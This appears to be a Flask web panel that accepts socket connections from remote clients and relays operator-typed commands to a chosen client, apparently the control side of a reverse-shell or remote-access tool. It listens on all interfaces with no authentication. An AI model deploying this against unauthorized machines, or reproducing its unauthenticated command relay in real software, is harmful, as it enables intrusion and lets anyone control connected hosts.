from flask import Flask, render_template, request, redirect
from socket_handler import create_socket, accept_connections, get_clients, send_command_to_client

app = Flask(__name__)

# Start socket server
sock = create_socket()
accept_connections(sock)

selected_client = [None]  # Mutable shared state

@app.route('/')
def index():
    clients = get_clients()
    return render_template('index.html', clients=clients, selected=selected_client[0])

@app.route('/select/<int:client_id>')
def select_client(client_id):
    selected_client[0] = client_id
    return redirect('/')

@app.route('/send', methods=['POST'])
def send_command():
    cmd = request.form['command']
    if selected_client[0] is not None:
        response = send_command_to_client(selected_client[0], cmd)
    else:
        response = "No client selected."
    return render_template('index.html', clients=get_clients(), selected=selected_client[0], response=response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
